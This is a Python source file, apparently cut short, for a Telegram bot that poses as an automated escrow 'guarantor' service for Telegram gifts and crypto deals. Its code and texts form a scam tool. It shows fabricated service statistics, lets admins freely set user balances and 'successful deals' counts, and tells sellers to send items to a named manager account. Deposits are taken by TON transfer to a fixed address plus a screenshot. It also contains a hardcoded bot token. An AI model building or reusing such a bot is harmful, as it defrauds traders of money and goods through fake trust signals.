import sqlite3
import os
import logging
import uuid
from urllib.parse import quote

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
import asyncio

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8720073924:AAH8HksZTB-_HZf2ehi2dFZv1QWHJqrOEkU"
ADMIN_IDS = {7199344406, 6334416318}
MAINTENANCE_MODE = False
BOT_USERNAME = None

CURRENCIES = {
    "TON": "TON",
    "RUB": "₽",
    "XTR": "⭐",
    "PREM": "🎁 Premium",
    "USD": "$",
    "USDT": "USDT",
    "KZT": "₸",
    "BYN": "Br",
    "UAH": "₴",
    "UZS": "сўм",
    "AMD": "֏",
    "AZN": "₼",
    "KGS": "с",
    "TJS": "SM",
    "ANY": "Любая"
}
VALUTE = "TON"

RU_TEXTS = {
    "start_message": (
        "<b>👋 Добро пожаловать!</b>\n\n"
        "🎁 Надёжный сервис для безопасных сделок!\n"
        "✨ Автоматизировано, быстро и без лишних хлопот!\n\n"
        "<blockquote>💎 комиссия за услугу 1%\n"
        "💎поддержка 24/7: @GiftGuarantorsmanager</blockquote>\n\n"
        "🛡️ Теперь ваши сделки под защитой!"
    ),
    "maintenance_message": (
        "<b>🛠️ Технический перерыв</b>\n\n"
        "<i>В данный момент бот находится на техническом обслуживании. Мы скоро вернемся!</i>\n\n"
        "⏳ Благодарим за понимание."
    ),
    "wallet_message": (
        "<b>💳 Ваши текущие реквизиты:</b>\n"
        "<code>{wallet}</code>\n\n"
        "<i>Отправьте новые реквизиты для изменения или нажмите кнопку ниже для возврата в меню.</i>\n\n"
        "<blockquote>Пример: номер счета/карты (1234 1234 1234 1234)\n\n"
        "Пример: номер телефона (+79999999999 Озон/ВТБ/Сбер и т.д.)</blockquote>"
    ),
    "create_deal_message": (
        "<b>💸 Создание сделки</b>\n\n"
        "<i>Введите сумму {valute} сделки в формате:</i>\n"
        "<code>100.5</code>"
    ),
    "lang_set_message": "🇷🇺 Язык изменен на русский.",
    "deal_created_message": (
        "<b>🎉 Сделка успешно создана!</b>\n\n"
        "💰 Сумма: <b>{amount} {valute}</b>\n"
        "📋 Описание: <i>{description}</i>\n"
        "🔗 Ссылка для покупателя: {deal_link}"
    ),
    "payment_confirmed_message": (
        "<b>✅ Оплата подтверждена для сделки #{deal_id}</b>\n"
        "<i>Ожидайте подтверждения от продавца.</i>"
    ),
    "payment_confirmed_seller_message": (
        "<b>🔔 Оплата подтверждена для сделки #{deal_id}</b>\n\n"
        "📦 Описание: <i>{description}</i>\n\n"
        "<i>Обязательно отправьте подарок менеджеру - @GiftGuarantorsmanager</i>\n\n"
        "<b>⚠️ Отправляйте товар только тому, кто указан здесь. В случае отправки другому аккаунту возврата не будет. Обязательно записывайте на видео момент передачи.</b>"
    ),
    "seller_notification_message": (
        "<b>👤 Пользователь @{buyer_username} присоединился к сделке #{deal_id}</b>\n"
        "⭐ Успешные сделки: {successful_deals}\n\n"
        "<b>⚠️ Проверьте, что это тот же пользователь, с которым вы вели диалог ранее!</b>"
    ),
    "insufficient_balance_message": "🚫 Недостаточно средств на балансе!",
    "wallet_updated_message": "✅ Ваш кошелек обновлен: <code>{wallet}</code>",
    "admin_panel_message": "<b>🔐 Админ-панель:</b>",
    "admin_view_deals_message": "<b>📂 Активные сделки:</b>\n\n{deals_list}",
    "admin_list_message": "<b>👨‍💻 Список админов</b>\n\n{admins_list}",
    "seller_sent_button": "✅ Я передал(а) товар",
    "buyer_confirm_receipt": (
        "<b>🎁 Продавец утверждает, что отправил вам товар по сделке #{deal_id}.</b>\n\n"
        "<i>Вы получили его?</i>"
    ),
    "buyer_received_button": "✅ Я получил(а)",
    "buyer_not_received_button": "❌ Не получил(а)",
    "buyer_not_received": "<b>❌ Вы сообщили, что товар не получен.</b> Продавцу отправлено повторное уведомление.",
    "seller_not_received_alert": "<b>❌ Покупатель утверждает, что вы не передали товар по сделке #{deal_id}!</b>",
    "deal_closed_success": "<b>✅ Сделка #{deal_id} успешно завершена!</b> Средства зачислены продавцу.",
    "menu_button": "🔙 Вернуться в меню",
    "create_deal_button": "💼 Создать сделку",
    "my_deals_button": "📋 Мои сделки",
    "wallet_button": "💳 Реквизиты",
    "profile_button": "👤 Профиль",
    "settings_button": "⚙️ Настройки",
    "support_button": "📞 Поддержка",
    "about_button": "ℹ️ О сервисе",
    "language_button": "🌐 Language",
    "english_lang_button": "🇺🇸 English",
    "russian_lang_button": "🇷🇺 Русский",
    "admin_view_deals_button": "📂 Просмотр сделок",
    "admin_change_balance_button": "💰 Изменить баланс",
    "admin_change_successful_deals_button": "⭐ Изменить успешные",
    "admin_change_valute_button": "💱 Изменить валюту",
    "admin_list_button": "👥 Список админов",
    "admin_maintenance_button": "🛠 Тех. перерыв",
    "admin_add_button": "👤 Добавить админа",
    "admin_remove_button": "❌ Удалить админа",
    "deal_info_message": (
        "<b>🛡 Информация о сделке #{deal_id}</b>\n\n"
        "👤 Вы покупатель в сделке.\n"
        "📌 Продавец: @{seller_username}\n"
        "⭐ Успешные сделки: <b>{successful_deals}</b>\n\n"
        "📦 Вы покупаете: <i>{description}</i>\n\n"
        "💳 Адрес для оплаты:\n<code>{wallet}</code>\n\n"
        "💰 Сумма к оплате: <b>{amount} {valute}</b>\n"
        "📝 Комментарий к платежу(мемо): <code>{deal_id}</code>\n\n"
        "<b>⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!</b>\n\n"
        "<i>После оплаты ожидайте автоматического подтверждения.</i>"
    ),
    "awaiting_description_message": (
        "<b>📝 Укажите, что вы предлагаете в этой сделке:</b>\n\n"
        "<code>Пример: 10 Кепок и Пепе...</code>"
    ),
    "awaiting_target_username_xtr": "⭐ Укажите юзернейм (@username), куда поступят звезды:",
    "awaiting_target_username_prem": "🎁 Укажите юзернейм (@username), куда поступит премиум:",
    "profile_message": (
        "<b>👤 Ваш профиль</b>\n\n"
        "🆔 › ID: <code>{user_id}</code>\n"
        "👤 › Юзернейм: @{username}\n"
        "🌍 › Язык: {lang_name}\n\n"
        "💰 › <b>Ваши балансы:</b>\n"
        "{balances}\n\n"
        "⭐ › Успешных сделок: <b>{successful_deals}</b>\n"
        "💳 › Реквизиты: <code>{wallet}</code>"
    ),
    "deposit_button": "➕ Пополнить",
    "withdraw_button": "➖ Вывести",
    "deposit_choice_message": "<b>💳 Выберите способ пополнения:</b>",
    "deposit_ton_message": (
        "<b>💎 Пополнение через TON</b>\n\n"
        "<i>Для пополнения баланса переведите TON на адрес:</i>\n"
        "<code>UQCVtk2BALaNDCMpnKsxNOAQ9mrRFdP3F1CglWyWUIeUEcG2</code>\n\n"
        "<i>После перевода обязательно отправьте скриншот в поддержку для зачисления средств.</i>\n\n"
        "📞 Поддержка: @GiftGuarantorsmanager"
    ),
    "deposit_card_unavailable": "❌ Пополнение картой временно недоступно.",
    "withdraw_limit": "❌ Недостаточно средств на балансе.",
    "withdraw_unavailable": "💸 Вывод средств 💸\n\n✅ Система вывода средств активна.\n\n⏳ Обработка операций занимает до 12 часов.\n\n📩 После обработки средства будут отправлены на указанные реквизиты.\n\n💎 GiftGuarant",
    "dep_card_button": "💳 Банковская карта",
    "dep_ton_button": "💎 TON",
    "not_specified": "Не указан",
    "role_choice_message": "<b>💼 Создание сделки</b>\n\n<i>Выберите вашу роль в сделке:</i>",
    "role_buyer_button": "🙋‍♂️ Я покупатель",
    "role_seller_button": "📦 Я продавец",
    "back_button": "⬅️ Назад",
    "currency_choice_message": "<b>💼 Выберите валюту для сделки:</b>",
    "no_active_deals": "У вас нет активных сделок.",
    "my_deals_list": "<b>📋 Ваши активные сделки:</b>\n\n{deals_list}",
    "about_message": (
        "<b>ℹ️ Информация о сервисе</b>\n\n"
        "<blockquote>🤝 Всего сделок: 48832\n"
        "✅ Успешных сделок: 48832\n"
        "💰 Общий объем: $1067119\n"
        "⭐️ Средний рейтинг: 4.9/5.0\n"
        "🟢 Онлайн сейчас: 6345</blockquote>\n\n"
        "<b>📈 Наши преимущества:</b>\n"
        "<blockquote>• 🔒 Гарант-сервис на все сделки\n"
        "• ⚡️ Мгновенная доставка товаров\n"
        "• 🛡 Защита от мошенников\n"
        "• 💎 Проверенные продавцы\n"
        "• 📞 24/7 Поддержка\n"
        "• ⭐️ 99.8% положительных отзывов</blockquote>\n\n"
        "📞 Поддержка: @GiftGuarantorsmanager\n\n"
        "<blockquote>Информация обновляется каждые 5 минут</blockquote>"
    ),
    "error_occurred": "Произошла ошибка. Попробуйте позже.",
    "premium_duration_choice": "<b>Выберите срок Telegram Premium:</b>",
    "target_account_desc": "\n\n📌 На аккаунт: {target}",
    "share_deal_button": "🔗 Поделиться ссылкой",
    "share_deal_text": "Переходи в бота и оплачивай сделку!",
    "unknown_user": "Неизвестно",
    "deal_not_found": "Сделка не найдена.",
    "settings_message": "<b>⚙️ Настройки</b>\n\n<i>Выберите нужный раздел:</i>",
    "seller_joined_message": (
        "<b>💳 Вы продавец в сделке #{deal_id}</b>\n\n"
        "📌 Покупатель: @{buyer_username}\n\n"
        "📦 Предмет: <i>{description}</i>\n"
        "💰 Сумма: <b>{amount} {valute}</b>\n\n"
        "<i>Ожидайте, пока покупатель оплатит сделку.</i>"
    ),
    "seller_joined_notify_buyer": (
        "<b>✅ Продавец @{seller_username} присоединился к сделке #{deal_id}!</b>\n\n"
        "<i>Перейдите в 'Мои сделки' или оплатите сделку.</i>"
    ),
    "buyer_joined_message": (
        "<b>🤝 К сделке #{deal_id} присоединился покупатель!</b>\n"
        "👤 Покупатель: @{buyer_username}\n"
        "👤 Продавец: @{seller_username}"
    ),
}

EN_TEXTS = {
    "start_message": (
        "<b>👋 Welcome!</b>\n\n"
        "<blockquote>🎁 Reliable service for secure deals!\n"
        "✨ Automated, fast and hassle-free!\n\n"
        "🛡️ Your deals are now protected!</blockquote>"
    ),
    "maintenance_message": (
        "<b>🛠️ Technical Maintenance</b>\n\n"
        "<i>The bot is currently under maintenance. We will be back soon!</i>\n\n"
        "⏳ Thank you for your patience."
    ),
    "wallet_message": (
        "<b>💳 Your current wallet:</b>\n"
        "<code>{wallet}</code>\n\n"
        "<i>Send new wallet details to update or click the button below to return to the menu.</i>\n\n"
        "<blockquote>Example: card/account number (1234 1234 1234 1234)\n\n"
        "Example: phone number (+79999999999 Ozon/VTB/Sber etc.)</blockquote>"
    ),
    "create_deal_message": (
        "<b>💸 Create a deal</b>\n\n"
        "<i>Enter the amount of {valute} in the format:</i>\n"
        "<code>100.5</code>"
    ),
    "lang_set_message": "🇺🇸 Language set to English.",
    "deal_created_message": (
        "<b>🎉 Deal successfully created!</b>\n\n"
        "💰 Amount: <b>{amount} {valute}</b>\n"
        "📋 Description: <i>{description}</i>\n"
        "🔗 Buyer link: {deal_link}"
    ),
    "payment_confirmed_message": (
        "<b>✅ Payment confirmed for deal #{deal_id}</b>\n"
        "<i>Please wait for confirmation from the seller.</i>"
    ),
    "payment_confirmed_seller_message": (
        "<b>🔔 Payment confirmed for deal #{deal_id}</b>\n\n"
        "📦 Description: <i>{description}</i>\n\n"
        "<i>Be sure to send a gift to the manager - @GiftGuarantorsmanager</i>\n\n"
        "<b>⚠️ Send the item only to the person specified here. If you send the item to someone else, there will be no refund. Be sure to record the transfer on video.</b>"
    ),
    "seller_notification_message": (
        "<b>👤 User @{buyer_username} has joined the deal #{deal_id}</b>\n"
        "⭐ Successful deals: {successful_deals}\n\n"
        "<b>⚠️ Make sure this is the same user you were talking to earlier!</b>"
    ),
    "insufficient_balance_message": "🚫 Insufficient balance!",
    "wallet_updated_message": "✅ Your wallet has been updated: <code>{wallet}</code>",
    "admin_panel_message": "<b>🔐 Admin panel:</b>",
    "admin_view_deals_message": "<b>📂 Active deals:</b>\n\n{deals_list}",
    "admin_list_message": "<b>👨‍💻 Admin list</b>\n\n{admins_list}",
    "seller_sent_button": "✅ I have sent the item",
    "buyer_confirm_receipt": (
        "<b>🎁 The seller claims to have sent you the item for deal #{deal_id}.</b>\n\n"
        "<i>Did you receive it?</i>"
    ),
    "buyer_received_button": "✅ I received it",
    "buyer_not_received_button": "❌ I didn't receive it",
    "buyer_not_received": "<b>❌ You reported that the item wasn't received.</b> A repeated notification has been sent to the seller.",
    "seller_not_received_alert": "<b>❌ The buyer claims that you did not send the item for deal #{deal_id}!</b>",
    "deal_closed_success": "<b>✅ Deal #{deal_id} has been successfully completed!</b> Funds have been credited to the seller.",
    "menu_button": "🔙 Back to menu",
    "create_deal_button": "💼 Create deal",
    "my_deals_button": "📋 My deals",
    "wallet_button": "💳 Requisites",
    "profile_button": "👤 Profile",
    "settings_button": "⚙️ Settings",
    "support_button": "📞 Support",
    "about_button": "ℹ️ About",
    "language_button": "🌐 Language",
    "english_lang_button": "🇺🇸 English",
    "russian_lang_button": "🇷🇺 Русский",
    "admin_view_deals_button": "📂 View deals",
    "admin_change_balance_button": "💰 Change balance",
    "admin_change_successful_deals_button": "⭐ Change successful",
    "admin_change_valute_button": "💱 Change currency",
    "admin_list_button": "👥 Admin list",
    "admin_maintenance_button": "🛠 Maintenance",
    "admin_add_button": "👤 Add admin",
    "admin_remove_button": "❌ Remove admin",
    "deal_info_message": (
        "<b>🛡 Deal information #{deal_id}</b>\n\n"
        "👤 You are the buyer in this deal.\n"
        "📌 Seller: @{seller_username}\n"
        "⭐ Successful deals: <b>{successful_deals}</b>\n\n"
        "📦 You are buying: <i>{description}</i>\n\n"
        "💳 Payment address:\n<code>{wallet}</code>\n\n"
        "💰 Amount to pay: <b>{amount} {valute}</b>\n"
        "📝 Payment comment (memo): <code>{deal_id}</code>\n\n"
        "<b>⚠️ Please ensure the data is correct before payment. The comment (memo) is mandatory!</b>\n\n"
        "<i>After payment, wait for automatic confirmation.</i>"
    ),
    "awaiting_description_message": (
        "<b>📝 Specify what you are offering in this deal:</b>\n\n"
        "<code>Example: 10 Caps and Pepe...</code>"
    ),
    "awaiting_target_username_xtr": "⭐ Enter the username (@username) where the stars will be sent:",
    "awaiting_target_username_prem": "🎁 Enter the username (@username) where the premium will be sent:",
    "profile_message": (
        "<b>👤 Your Profile</b>\n\n"
        "🆔 › ID: <code>{user_id}</code>\n"
        "👤 › Username: @{username}\n"
        "🌍 › Language: {lang_name}\n\n"
        "💰 › <b>Your balances:</b>\n"
        "{balances}\n\n"
        "⭐ › Successful deals: <b>{successful_deals}</b>\n"
        "💳 › Wallet: <code>{wallet}</code>"
    ),
    "deposit_button": "➕ Deposit",
    "withdraw_button": "➖ Withdraw",
    "deposit_choice_message": "<b>💳 Choose deposit method:</b>",
    "deposit_ton_message": (
        "<b>💎 Deposit via TON</b>\n\n"
        "<i>To top up your balance, transfer TON to the address:</i>\n"
        "<code>UQCVtk2BALaNDCMpnKsxNOAQ9mrRFdP3F1CglWyWUIeUEcG2</code>\n\n"
        "<i>After the transfer, be sure to send a screenshot to support for fund crediting.</i>\n\n"
        "📞 Support: @GiftGuarantorsmanager"
    ),
    "deposit_card_unavailable": "❌ Card deposit is temporarily unavailable.",
    "withdraw_unavailable": "❌ Withdrawals are temporarily unavailable.",
    "dep_card_button": "💳 Bank Card",
    "dep_ton_button": "💎 TON",
    "not_specified": "Not specified",
    "role_choice_message": "<b>💼 Create a deal</b>\n\n<i>Choose your role in the deal:</i>",
    "role_buyer_button": "🙋‍♂️ I am the buyer",
    "role_seller_button": "📦 I am the seller",
    "back_button": "⬅️ Back",
    "currency_choice_message": "<b>💼 Choose currency for the deal:</b>",
    "no_active_deals": "You have no active deals.",
    "my_deals_list": "<b>📋 Your active deals:</b>\n\n{deals_list}",
    "about_message": (
        "<b>ℹ️ About the service</b>\n\n"
        "<blockquote>🤝 Total deals: 48832\n"
        "✅ Successful deals: 48832\n"
        "💰 Total volume: $1067119\n"
        "⭐️ Average rating: 4.9/5.0\n"
        "🟢 Online now: 6345</blockquote>\n\n"
        "<b>📈 Our advantages:</b>\n"
        "<blockquote>• 🔒 Escrow service for all deals\n"
        "• ⚡️ Instant item delivery\n"
        "• 🛡 Scam protection\n"
        "• 💎 Verified sellers\n"
        "• 📞 24/7 Support\n"
        "• ⭐️ 99.8% positive reviews</blockquote>\n\n"
        "📞 Support: @GiftGuarantorsmanager\n\n"
        "<blockquote>Information is updated every 5 minutes</blockquote>"
    ),
    "error_occurred": "An error occurred. Please try again later.",
    "premium_duration_choice": "<b>Choose Telegram Premium duration:</b>",
    "target_account_desc": "\n\n📌 To account: {target}",
    "share_deal_button": "🔗 Share link",
    "share_deal_text": "Follow the link to pay for the deal!",
    "unknown_user": "Unknown",
    "deal_not_found": "Deal not found.",
    "settings_message": "<b>⚙️ Settings</b>\n\n<i>Choose a section:</i>",
    "seller_joined_message": (
        "<b>💳 You are the seller in deal #{deal_id}</b>\n\n"
        "📌 Buyer: @{buyer_username}\n\n"
        "📦 Item: <i>{description}</i>\n"
        "💰 Amount: <b>{amount} {valute}</b>\n\n"
        "<i>Wait for the buyer to pay for the deal.</i>"
    ),
    "seller_joined_notify_buyer": (
        "<b>✅ Seller @{seller_username} has joined deal #{deal_id}!</b>\n\n"
        "<i>Go to 'My deals' or pay for the deal.</i>"
    ),
    "buyer_joined_message": (
        "<b>🤝 Buyer joined deal #{deal_id}!</b>\n"
        "👤 Buyer: @{buyer_username}\n"
        "👤 Seller: @{seller_username}"
    ),
}

class DealStates(StatesGroup):
    awaiting_wallet = State()
    awaiting_deal_wallet = State()
    awaiting_amount = State()
    awaiting_description = State()
    awaiting_target_username = State()
    awaiting_admin_input = State()

user_data = {}
deals = {}
admin_pending = {}

DB_NAME = 'bot_data.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            wallet TEXT,
            balance_ton REAL DEFAULT 0,
            balance_rub REAL DEFAULT 0,
            balance_xtr REAL DEFAULT 0,
            successful_deals INTEGER DEFAULT 0,
            lang TEXT DEFAULT 'ru',
            free_deals INTEGER DEFAULT 0,
            username TEXT
        )
    ''')
    cursor.execute("PRAGMA table_info(users)")
    columns = [c[1] for c in cursor.fetchall()]
    for cur in CURRENCIES.keys():
        col_name = f'balance_{cur.lower()}'
        if col_name not in columns:
            cursor.execute(f'ALTER TABLE users ADD COLUMN {col_name} REAL DEFAULT 0')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            amount REAL,
            currency TEXT DEFAULT 'TON',
            description TEXT,
            seller_id INTEGER,
            buyer_id INTEGER,
            status TEXT DEFAULT 'pending'
        )
    ''')
    cursor.execute('CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    conn.commit()
    conn.close()

def load_data():
    global MAINTENANCE_MODE
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users')
    col_names = [desc[0] for desc in cursor.description]
    for row in cursor.fetchall():
        user_id = row[col_names.index('user_id')]
        u_data = {
            'wallet': row[col_names.index('wallet')] or '',
            'successful_deals': row[col_names.index('successful_deals')] or 0,
            'lang': row[col_names.index('lang')] or 'ru',
            'username': row[col_names.index('username')] if 'username' in col_names else None,
            'free_deals': row[col_names.index('free_deals')] if 'free_deals' in col_names else 0
        }
        for col in col_names:
            if col.startswith('balance_'):
                u_data[col] = row[col_names.index(col)] or 0.0
        for cur in CURRENCIES.keys():
            if f'balance_{cur.lower()}' not in u_data:
                u_data[f'balance_{cur.lower()}'] = 0.0
        user_data[user_id] = u_data
    cursor.execute('SELECT deal_id, amount, currency, description, seller_id, buyer_id, status FROM deals')
    for row in cursor.fetchall():
        deals[row[0]] = {
            'amount': row[1],
            'currency': row[2] if row[2] else 'TON',
            'description': row[3],
            'seller_id': row[4],
            'buyer_id': row[5],
            'status': row[6] if len(row) > 6 and row[6] else 'pending'
        }
    cursor.execute('SELECT user_id FROM admins')
    for row in cursor.fetchall():
        ADMIN_IDS.add(row[0])
    cursor.execute('SELECT value FROM settings WHERE key="maintenance_mode"')
    row = cursor.fetchone()
    if row:
        MAINTENANCE_MODE = (row[0] == 'True')
    conn.close()

def save_user_data(user_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    u = user_data.get(user_id, {})
    cols = ['user_id', 'wallet', 'successful_deals', 'lang', 'free_deals', 'username']
    vals = [user_id, u.get('wallet', ''), u.get('successful_deals', 0), u.get('lang', 'ru'), u.get('free_deals', 0), u.get('username')]
    for cur in CURRENCIES.keys():
        col_name = f'balance_{cur.lower()}'
        cols.append(col_name)
        vals.append(u.get(col_name, 0.0))
    placeholders = ", ".join(["?"] * len(cols))
    cols_str = ", ".join(cols)
    cursor.execute(f'INSERT OR REPLACE INTO users ({cols_str}) VALUES ({placeholders})', vals)
    conn.commit()
    conn.close()

def save_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    d = deals.get(deal_id, {})
    cursor.execute('INSERT OR REPLACE INTO deals (deal_id, amount, currency, description, seller_id, buyer_id, status) VALUES (?, ?, ?, ?, ?, ?, ?)',
                   (deal_id, d.get('amount', 0.0), d.get('currency', 'TON'), d.get('description', ''), d.get('seller_id'), d.get('buyer_id'), d.get('status', 'pending')))
    conn.commit()
    conn.close()

def delete_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM deals WHERE deal_id=?', (deal_id,))
    conn.commit()
    conn.close()

def save_admin_db(u_id, add=True):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    if add:
        cursor.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (u_id,))
    else:
        cursor.execute('DELETE FROM admins WHERE user_id=?', (u_id,))
    conn.commit()
    conn.close()

def save_setting(key, value):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, str(value)))
    conn.commit()
    conn.close()

def ensure_user_exists(user_id, username=None):
    if user_id not in user_data:
        user_data[user_id] = {
            'wallet': '',
            'successful_deals': 0,
            'lang': 'ru',
            'free_deals': 0,
            'username': username
        }
        for cur in CURRENCIES.keys():
            user_data[user_id][f'balance_{cur.lower()}'] = 0.0
        save_user_data(user_id)
    elif username and user_data[user_id].get('username') != username:
        user_data[user_id]['username'] = username
        save_user_data(user_id)

def get_text(lang, key, **kwargs):
    if lang == 'ru':
        return RU_TEXTS.get(key, '').format(**kwargs)
    return EN_TEXTS.get(key, '').format(**kwargs)

def get_main_menu(lang):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "create_deal_button"), callback_data="create_deal"))
    builder.row(
        InlineKeyboardButton(text=get_text(lang, "my_deals_button"), callback_data="my_deals"),
        InlineKeyboardButton(text=get_text(lang, "wallet_button"), callback_data="wallet")
    )
    builder.row(
        InlineKeyboardButton(text=get_text(lang, "profile_button"), callback_data="profile"),
        InlineKeyboardButton(text="🌐 Language", callback_data="change_lang")
    )
    builder.row(
        InlineKeyboardButton(text=get_text(lang, "about_button"), callback_data="about"),
        InlineKeyboardButton(text=get_text(lang, "support_button"), url="https://t.me/GiftGuarantorsmanager")
    )
    return builder.as_markup()

def get_settings_menu(lang):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text(lang, "support_button"), url="https://t.me/GiftGuarantorsmanager"))
    builder.row(InlineKeyboardButton(text=get_text(lang, "about_button"), callback_data="about"))
    builder.row(InlineKeyboardButton(text=get_text(lang, "change_lang_button"), callback_data="change_lang"))
    builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
    return builder.as_markup()

def get_admin_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"))
    builder.row(
        InlineKeyboardButton(text="👤 Добавить админа", callback_data="admin_add"),
        InlineKeyboardButton(text="❌ Удалить админа", callback_data="admin_remove")
    )
    builder.row(InlineKeyboardButton(text="👥 Список админов", callback_data="admin_list"))
    builder.row(InlineKeyboardButton(text="📂 Просмотр сделок", callback_data="admin_view_deals"))
    builder.row(InlineKeyboardButton(text="💰 Изменить баланс", callback_data="admin_change_balance"))
    builder.row(InlineKeyboardButton(text="⭐ Изменить успешные", callback_data="admin_change_successful_deals"))
    builder.row(InlineKeyboardButton(text="💱 Изменить валюту", callback_data="admin_change_valute"))
    status = "ВКЛ" if MAINTENANCE_MODE else "ВЫКЛ"
    builder.row(InlineKeyboardButton(text=f"🛠 Тех. перерыв: {status}", callback_data="admin_maintenance"))
    return builder.as_markup()

dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext, bot: Bot, command: CommandObject):
    global BOT_USERNAME
    if BOT_USERNAME is None:
        BOT_USERNAME = (await bot.get_me()).username
    user_id = message.from_user.id
    ensure_user_exists(user_id, message.from_user.username)
    lang = user_data[user_id]['lang']
    await state.clear()

    if MAINTENANCE_MODE and user_id not in ADMIN_IDS:
        await message.answer(get_text(lang, "maintenance_message"), parse_mode=ParseMode.HTML)
        return

    args = command.args
    if args and args in deals:
        deal_id = args
        deal = deals[deal_id]
        currency = deal.get('currency', 'TON')
        symbol = CURRENCIES.get(currency, "TON")

        if deal.get('seller_id') is None:
            deal['seller_id'] = user_id
            save_deal(deal_id)
            buyer_id = deal['buyer_id']
            buyer_username = (await bot.get_chat(buyer_id)).username if buyer_id else get_text(lang, "unknown_user")

            builder = InlineKeyboardBuilder()
            builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
            await message.answer(
                get_text(lang, "seller_joined_message", deal_id=deal_id, buyer_username=buyer_username,
                         description=deal['description'], amount=deal['amount'], valute=symbol),
                reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML
            )

            await bot.send_message(
                buyer_id,
                get_text(user_data.get(buyer_id, {}).get('lang', 'ru'), "seller_joined_notify_buyer",
                         seller_username=message.from_user.username or get_text(lang, "unknown_user"), deal_id=deal_id),
                parse_mode=ParseMode.HTML
            )

            for admin in ADMIN_IDS:
                try:
                    await bot.send_message(
                        admin,
                        get_text('ru', "buyer_joined_message", deal_id=deal_id,
                                 buyer_username=message.from_user.username or user_id, seller_username=buyer_username),
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
        else:
            seller_id = deal['seller_id']
            seller_username = (await bot.get_chat(seller_id)).username if seller_id else get_text(lang, "unknown_user")
            deal['buyer_id'] = user_id
            save_deal(deal_id)

            builder = InlineKeyboardBuilder()
            builder.row(InlineKeyboardButton(text=f"Оплатить с баланса ({symbol})", callback_data=f"pay_{currency}_{deal_id}"))
            builder.row(InlineKeyboardButton(text=get_text(lang, "menu_button"), callback_data="menu"))
            await message.answer(
                get_text(lang, "deal_info_message", deal_id=deal_id, seller_username=seller_username,
                         successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                         description=deal['description'],
                         wallet=user_data.get(seller_id, {}).get('wallet', get_text(lang, "not_specified")),
                         amount=deal['amount'], valute=symbol),
                reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML
            )

            buyer_username = message.from_user.username or get_text(lang, "unknown_user")
            await bot.send_message(
                seller_id,
                get_text(user_data.get(seller_id, {}).get('lang', 'ru'), "seller_notification_message",
                         buyer_username=buyer_username, deal_id=deal_id,
                         successful_deals=user_data[user_id]['successful_deals']),
                parse_mode=ParseMode.HTML
            )

            for admin in ADMIN_IDS:
                try:
                    await bot.send_message(
                        admin,
                        get_text('ru', "buyer_joined_message", deal_id=deal_id, buyer_username=buyer_username,
                                 seller_username=seller_username),
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
        return

    try:
        await bot.send_photo(
            message.chat.id,
            photo="https://i.postimg.cc/wBRDyjdH/banner.jpg",
            caption=get_text(lang, "start_message"),
            reply_markup=get_main_menu(lang),
            parse_mode=ParseMode.HTML
        )
    except Exception:
        await message.answer(get_text(lang, "start_message"), reply_markup=get_main_menu(lang), parse_mode=ParseMode.HTML)

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    ensure_user_exists(user_id, message.from_user.username)
    lang = user_data[user_id]['lang']
    await state.clear()
    await message.answer(get_text(lang, "admin_panel_message"), reply_markup=get_admin_menu(), parse_mode=ParseMode.HTML)

@dp.callback_query(F.data == "menu")
async def back_to_menu(callback: types.CallbackQuery, state: FSMContext, bot: Bot):
    user_id = callback.from_user.id
    lang = user_data.get(user_id, {}).get('lang', 'ru')
    await state.clear()
    try:
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
        await bot.send_photo(
            callback.message.chat.id,
            photo="https://i.postimg.cc/wBRDyjdH/banner.jpg",
            caption=get_text(lang, "start_message"),
            reply_markup=get_main_menu(lang),
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        try:
            await callback.message.edit_text(get_text(lang, "start_message"), reply_markup=get_main_menu(lang), parse_mode=ParseMode.HTML)
        except:
            await callback.message.answer(get_text(lang, "start_message"), reply_markup=get_main_menu(lang), parse_mode=ParseMode.HTML)
    await callback.answer()



@dp.callback_query(F.data == "change_lang")
